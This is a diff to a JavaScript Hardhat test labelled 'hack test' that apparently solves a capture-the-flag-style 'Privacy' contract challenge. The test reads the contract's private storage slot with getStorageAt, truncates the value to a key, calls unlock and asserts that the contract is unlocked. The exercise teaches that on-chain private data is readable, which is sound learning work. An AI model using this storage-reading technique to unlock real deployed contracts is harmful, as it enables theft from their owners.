@@ -15,10 +15,17 @@ describe("test", function () {
             ethers.utils.formatBytes32String("ETH2"),
             ethers.utils.formatBytes32String("ETH3"),
         ]);
+
+        // Privacy = await PrivacyInstance.deploy([
+        //     ethers.utils.formatBytes32String("ETH1").slice(0, 34),
+        //     ethers.utils.formatBytes32String("ETH2").slice(0, 34),
+        //     ethers.utils.formatBytes32String("ETH3").slice(0, 34),
+        // ]);
     });
     it("hack test", async function () {
         const r = await ethers.provider.getStorageAt(Privacy.address, 5);
-        console.log(ethers.utils.parseBytes32String(r)); //ETH2
+        expect(ethers.utils.parseBytes32String(r)).to.equal("ETH3");
+
         const key = r.slice(0, 34);
         await Privacy.unlock(key);
         expect(await Privacy.locked()).to.equal(false);
